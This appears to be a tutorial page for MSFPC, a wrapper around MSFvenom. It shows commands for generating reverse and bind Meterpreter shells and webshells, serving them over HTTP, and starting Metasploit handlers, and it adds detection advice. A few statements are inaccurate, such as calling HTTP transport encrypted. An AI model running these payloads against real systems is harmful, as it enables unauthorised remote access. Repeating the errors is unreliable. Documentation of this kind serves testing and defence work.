---
title: "MSFvenom Payload Creator (MSFPC)"
tool_name: "msfpc"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Beginner"
platform: "Linux"
language: "Bash"
license: "MIT"
repository: "https://github.com/g0tm1k/msfpc"
kali_package: "msfpc"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "payload-generation"
  - "metasploit"
  - "simplified"
  - "wrapper"
date_created: "2017-01-01"
last_updated: "2023-01-01"
author: "g0tm1k"
---

# MSFvenom Payload Creator (MSFPC) — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

MSFPC (MSFvenom Payload Creator) is a bash wrapper around MSFvenom that simplifies payload generation through semi-interactive prompts. It eliminates the need to memorize MSFvenom's complex flag combinations by asking users to select their target type, connection method, and delivery format.

### Why Use MSFPC?

MSFvenom offers dozens of flags and hundreds of payload combinations. MSFPC reduces this complexity to a series of choices:

1. **Target type**: Windows, Linux, macOS, Android, PHP, etc.
2. **Connection**: Reverse or bind
3. **Port**: Custom or default
4. **Transport**: TCP, HTTP, HTTPS

The tool also generates matching Metasploit handler resource scripts, ready-to-use HTTP servers, and file hashes for integrity verification.

### Relationship to MSFvenom

MSFPC is not a replacement for MSFvenom — it is a convenience wrapper. For full control over payload generation, use MSFvenom directly. MSFPC is ideal for beginners, rapid prototyping, and batch generation.

---

## Chapter 2: Installation & Setup

### Kali Linux (Pre-installed)

```bash
sudo apt update && sudo apt install msfpc
```

**Explanation:** Installs MSFPC from the Kali repository. The `metasploit-framework` package must also be installed.

### From Source

```bash
git clone https://github.com/g0tm1k/msfpc.git
cd msfpc
chmod +x msfpc.sh
sudo cp msfpc.sh /usr/bin/msfpc
```

**Explanation:** Clones the repository and installs the script to the system path.

### Verify Installation

```bash
msfpc -h
```

Expected output:

```
[*] MSFvenom Payload Creator (MSFPC v1.4.5)

/usr/bin/msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
```

---

## Chapter 3: Basic Usage

### Semi-Interactive Payload Generation

```bash
msfpc windows bind 5555 verbose
```

**Explanation:** Generates a Windows Meterpreter bind shell on port 5555 with verbose output, prompting for network interface selection.

### Fully Automatic Payload Generation

```bash
msfpc windows eth0
```

**Explanation:** Automatically generates a Windows reverse Meterpreter using eth0's IP address and default port 443, with no prompts.

### Simplest Usage — Prompt-Based

```bash
msfpc
```

**Explanation:** Launches MSFPC with a fully interactive menu, prompting for every option including target type, IP address, and connection method.

### Complete Usage Patterns

| Command | Description |
|---------|-------------|
| `msfpc windows 192.168.1.100` | Windows reverse TCP to manual IP |
| `msfpc elf bind eth0 4444` | Linux bind shell on eth0's IP |
| `msfpc stageless cmd py https` | Python stageless command shell over HTTPS |
| `msfpc verbose loop eth1` | Generate one payload per type using eth1 |
| `msfpc msf batch wan` | All Meterpreter payloads using WAN IP |
| `msfpc help verbose` | Extended help with detailed descriptions |

### Generated Output

Each MSFPC run produces:

1. **The payload file** (e.g., `windows-meterpreter-staged-reverse-tcp-443.exe`)
2. **A Metasploit handler resource script** (e.g., `*-exe.rc`)
3. **File hash information** (MD5, SHA1, SHA256)
4. **Optional**: HTTP server suggestion for delivery

```bash
# Launch the matching handler
msfconsole -q -r /root/windows-meterpreter-staged-reverse-tcp-443-exe.rc
```

**Explanation:** The generated .rc file configures a matching Metasploit handler — set LHOST, LPORT, and PAYLOAD automatically.

---

## Chapter 4: Intermediate Usage

### Payload Types and Formats

| TYPE | Output | Description |
|------|--------|-------------|
| **windows** | `.exe` | Windows PE executable |
| **linux** | `.elf` | Linux ELF binary |
| **osx** | `.macho` | macOS Mach-O binary |
| **android** | `.apk` | Android application package |
| **php** | `.php` | PHP webshell |
| **asp** | `.asp` | ASP webshell |
| **aspX** | `.aspx` | ASPX webshell |
| **jsp** | `.jsp` | Java JSP webshell |
| **war** | `.war` | Java WAR archive |
| **bash** | `.sh` | Bash script |
| **perl** | `.pl` | Perl script |
| **python** | `.py` | Python script |
| **powershell** | `.ps1` | PowerShell script |
| **tomcat** | `.war` | Tomcat WAR archive |

### Connection Methods

| Method | Description | When to Use |
|--------|-------------|-------------|
| **reverse** | Target connects back to attacker | Most common — bypasses ingress firewalls |
| **bind** | Attacker connects to target | When target is behind NAT but attacker has network access |

### Transport Methods

| Transport | Description | Evasion Level |
|-----------|-------------|---------------|
| **tcp** | Raw TCP connection | None — easily detected by IDS |
| **http** | HTTP-encrypted communication | Basic — blends with web traffic |
| **https** | SSL-encrypted HTTP communication | Better — encrypted, harder to inspect |
| **find_port** | Port scanning for open ports | Maximum — tries every port |

### Batch Generation

```bash
msfpc msf batch wan
```

**Explanation:** Generates every possible Meterpreter payload combination — all types, both bind and reverse, staged and stageless, across all transport methods.

### Loop Generation

```bash
msfpc verbose loop eth0
```

**Explanation:** Generates one payload for each target type (Windows, Linux, etc.) using eth0's IP address.

---

## Chapter 5: Advanced Usage

### Scripting with MSFPC

```bash
#!/bin/bash
# Automated multi-target payload generation
TARGETS=("windows" "linux" "osx" "php" "python")
IP="192.168.1.100"
PORT="4444"

for target in "${TARGETS[@]}"; do
    msfpc "$target" "$IP" "$PORT" msf reverse
    echo "[+] Generated $target payload"
done
```

**Explanation:** Automates MSFPC for generating payloads across multiple platforms in a single script.

### Integration with Delivery Mechanisms

```bash
# Generate and set up delivery
msfpc windows eth0

# Start HTTP server for file transfer
python3 -m http.server 8080 &

# Generate handler
msfconsole -q -r /root/windows-meterpreter-*.rc
```

**Explanation:** MSFPC's output integrates with standard HTTP servers for payload delivery and Metasploit handlers for connection management.

### Staged vs Stageless Decision Matrix

| Scenario | Use Staged | Use Stageless |
|----------|-----------|---------------|
| Reliable network | Yes — smaller payload | No |
| Unreliable network | No — requires staging | Yes — standalone |
| AV evasion | Yes — smaller footprint | No — full payload on disk |
| CTF/testing | Either | Stageless for simplicity |
| Restricted download size | Yes | No |

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Quick Payload for CTF

```bash
# Generate a simple reverse shell for a CTF
msfpc windows 10.10.14.5 4444

# Deliver to target
python3 -m http.server 8080

# Set up handler
msfconsole -q -r /root/windows-meterpreter-staged-reverse-tcp-4444-exe.rc
```

**Explanation:** MSFPC's simplicity makes it ideal for rapid payload generation in CTF competitions where speed matters more than customization.

### Scenario 2: Multi-Platform Engagement

A red team needed payloads for Windows, Linux, and macOS targets from the same engagement:

```bash
# Generate payloads for all platforms
msfpc windows eth0 reverse
msfpc linux eth0 reverse
msfpc osx eth0 reverse

# Each generates a payload + handler script
# Total setup time: under 30 seconds
```

**Explanation:** MSFPC enables rapid deployment of multi-platform payloads without remembering platform-specific MSFvenom syntax.

### Scenario 3: Purple Team Validation

The blue team needed to test detection across multiple payload types:

```bash
# Generate all combinations for comprehensive testing
msfpc verbose loop eth0

# Results include payloads for every platform
# Test each against the detection pipeline
# Document detection rates per platform
```

**Explanation:** MSFPC's loop mode generates the full matrix of payloads needed for comprehensive AV/EDR testing.

---

## Chapter 7: Detection & Defense

### MSFPC-Specific Indicators

MSFPC generates standard MSFvenom payloads with predictable characteristics:
- Default output directory patterns
- Filename conventions: `{platform}-{type}-{method}-{port}.{ext}`
- Standard handler resource scripts

### Detection Strategies

- **Monitor** default output directories for payload creation
- **Alert** on MSFvenom process execution
- **Scan** generated files against known MSFvenom signatures
- **Watch** for handler resource scripts being consumed
- **Track** batch generation patterns indicative of preparation

### Defensive Measures

1. **Deploy EDR** with MSFvenom detection rules
2. **Monitor** process creation chains (bash → msfvenom)
3. **Block** known MSFvenom payload signatures
4. **Alert** on batch payload generation patterns
5. **Restrict** Metasploit Framework installation on workstations
6. **Monitor** access to /root/ and /tmp/ directories for payload files

### MSFPC vs MSFvenom Decision Guide

| Factor | Use MSFPC | Use MSFvenom Directly |
|--------|-----------|----------------------|
| Speed | Quick one-liner generation | Slightly slower with flags |
| Customization | Limited to preset options | Full control over all parameters |
| Learning curve | Beginner-friendly prompts | Requires flag knowledge |
| Batch generation | Loop/batch modes built-in | Requires scripting |
| Output formats | Standard formats only | All MSFvenom formats |
| Encoding | Generic/none by default | Full encoder selection |
| Templates | Not supported | Template injection with -x |
| Automation | Limited scripting | Full scripting support |

---

## Chapter 8: Troubleshooting

### "msfvenom: command not found"

**Cause:** Metasploit Framework is not installed.

```bash
sudo apt install metasploit-framework
```

**Explanation:** MSFPC is a wrapper that calls msfvenom. The Metasploit Framework must be installed separately.

### "Permission denied"

**Cause:** Script is not executable.

```bash
chmod +x /usr/bin/msfpc
```

**Explanation:** Ensure the MSFPC script has execute permissions.

### Handler Doesn't Connect

**Cause:** The generated .rc file has incorrect LHOST.

```bash
# Verify the handler settings
cat /root/*-exe.rc

# Manually launch with correct settings
msfconsole -q -x "
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
"
```

**Explanation:** MSFPC auto-detects IP addresses, which may not always be correct. Verify and manually adjust LHOST if needed.

---

## Resources

- [MSFPC GitHub](https://github.com/g0tm1k/msfpc) — Source code and documentation
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) — MSFvenom reference
- [MSFvenom Documentation](https://docs.rapid7.com/metasploit/) — Official MSFvenom docs
- [HackTheBox](https://www.hackthebox.com/) — Practice environments

---

*Last updated: July 2026*
